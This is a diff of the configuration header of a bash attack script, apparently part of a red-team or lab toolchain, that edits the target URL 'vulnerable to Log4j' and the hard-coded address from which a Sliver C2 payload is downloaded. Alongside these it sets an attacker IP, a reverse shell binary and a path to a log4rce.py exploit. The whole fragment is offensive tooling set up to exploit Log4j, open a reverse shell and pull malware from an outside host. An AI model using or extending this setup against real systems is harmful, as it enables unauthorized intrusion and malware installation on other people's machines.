@@ -1,9 +1,9 @@
 #!/bin/bash
 
 attacker_ip="<set IP>" # IP address of the host executing this script
-vulnerable_url="http://208.11.20.100:8080/msn_apps/api/vulnerable/user" # Url vulnerable to Log4j
+vulnerable_url="http://208.11.21.100:8080/msn_apps/api/vulnerable/user" # Url vulnerable to Log4j
 reverse_shell="./ReverseShell" # Do not include file extention, e.g. '/home/user/folder/ReverseShell'
-c2_payload_url='http://94.249.192.1:8000/updater.exe' # Location of where the Sliver malware is hosted
+c2_payload_url='http://94.249.192.5:8000/missingno.exe' # Location of where the Sliver malware is hosted
 log4rce="./log4rce.py" # Path to log4rce.py
 
 
